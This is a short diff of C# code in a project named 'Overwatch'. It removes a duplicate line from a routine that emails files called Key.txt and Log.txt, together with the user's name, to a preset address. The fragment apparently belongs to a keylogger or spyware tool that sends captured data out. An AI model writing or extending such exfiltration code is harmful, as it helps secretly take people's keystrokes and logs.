@@ -22,7 +22,6 @@ namespace Overwatch
                         MailMessage message = new MailMessage(from, to);
                         message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Key.txt"));
                         message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Log.txt"));
-                        message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Log.txt"));
                         message.Subject = "Information";
                         message.Body = "<h2>"+cReceiveInformation.UsersName+"</h2>";
                         message.IsBodyHtml = true;
